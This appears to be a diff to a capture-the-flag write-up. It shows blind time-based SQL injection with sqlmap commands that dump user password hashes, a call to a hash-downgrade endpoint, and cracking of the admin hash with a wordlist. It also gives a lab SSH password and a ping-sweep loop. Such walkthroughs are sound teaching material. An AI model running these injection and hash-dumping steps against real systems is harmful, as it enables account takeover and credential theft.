@@ -31,6 +31,7 @@ So admin userid is 1.
 ## SQLi
 
 SQL injection is possible in the getUserID endpoint. Since we do not get any data back and is not use in a login form, we can use a blind time-based injection to get the hash of the password. Using SQLMap, since this type of injection is really slow, we can order by id, which will start with 1 and therefore start with the admin and we can also use the ssh client offered to reduce network lag with the password `marbled-casino-zodiac-composer` and do a ping sweep to detect the ip of the webserver.
+Since the injection is on the username, we should use a username that doesn't exist. Otherwise, the server calculate the hash everytime, which takes a lot of time for bcrypt 16. 
 
 ```shell
 ssh user@<ip_client>
@@ -40,10 +41,10 @@ for i in {1..254} ;do (ping -c 1 <base_ip>.$i | grep "bytes from" &) ;done
 ```
 
 ```shell
-sqlmap -u "http://$ip:$port/login"  --data 'username=admin&password=test' -C id,password_hash,salt -T Users -D userDB --dump  --batch --dbms MySQL -p username --technique=T
+sqlmap -u "http://$ip:$port/login"  --data 'username=ausndbaiusdbniand&password=test' -C id,password_hash,salt -T Users -D userDB --dump  --batch --dbms MySQL -p username --technique=T
 ```
 
-It should take a minimum of 30 minutes, but we can stop quickly, when we see that it starts with `$2a$10$`, which is 'bcrypt' with 10 rounds. It is very slow to crack.
+When we see that it starts with `$2a$16$`, which is 'bcrypt' with 16 rounds, we can stop since it is very slow to crack.
 
 ![alt text](sqlmap_1.png)
 
@@ -52,7 +53,7 @@ It should take a minimum of 30 minutes, but we can stop quickly, when we see tha
 Get the hashing algorithms:
 
 ```shell
-sqlmap -u "http://$ip:$port/login"  --data 'username=admin&password=test' -C id,algo,round -T HashingAlgorithm -D userDB --dump  --batch --dbms MySQL -p username --technique=T
+sqlmap -u "http://$ip:$port/login"  --data 'username=ausndbaiusdbniand&password=test' -C id,algo,round -T HashingAlgorithm -D userDB --dump  --batch --dbms MySQL -p username --technique=T
 
 Database: userDB
 Table: HashingAlgorithm
@@ -76,19 +77,19 @@ curl "http://$ip:$port/changeHash" \
   --insecure
 ```
 
-Next time, the admin login, the password will be changed. In the information given in the challenge, we can see it should be every 30 seconds.
+Next time, the admin login, the password will be changed. In the information given in the challenge and in the admin_login.sh script, we can see it should be every 30 seconds.
 
 ## SQLi 2
 
 Running SQLMap again, we can see that the hash is now blake2b with 1 round.
 
 ```shell
-sqlmap -u "http://$ip:$port/login"  --data 'username=admin&password=test' -C id,password_hash,salt -T Users -D userDB --dump  --batch --dbms MySQL -p username --technique=T --flush-session
+sqlmap -u "http://$ip:$port/login"  --data 'username=ausndbaiusdbniand&password=test' -C id,password_hash,salt -T Users -D userDB --dump  --batch --dbms MySQL -p username --technique=T --flush-session
 
 +----+------------------------------------------------------------------+------------+
 | id | password_hash                                                    | salt       |
 +----+------------------------------------------------------------------+------------+
-| 1  | 8eddab594c92c9dd9506bd22b38fd4c0fff439a63b698f37a1f21ea6f0072717 | ajg835Eoef |
+| 1  | 1a5708112d2d7df23e4b2d5b60d5470e8cd01ce48ed8d5dae8d32901d91dc326 | WKgDlQLWIE |
 +----+------------------------------------------------------------------+------------+
 ```
 
@@ -99,7 +100,7 @@ sqlmap -u "http://$ip:$port/login"  --data 'username=admin&password=test' -C id,
 Using a simple script like solve.go, we can crack the hash in a few seconds.
 
 ```shell
-go run solve.go 8eddab594c92c9dd9506bd22b38fd4c0fff439a63b698f37a1f21ea6f0072717 ajg835Eoef rockyou.txt
+go run solve.go 1a5708112d2d7df23e4b2d5b60d5470e8cd01ce48ed8d5dae8d32901d91dc326 WKgDlQLWIE rockyou.txt
 Password found:  drakthull1
 ```
 
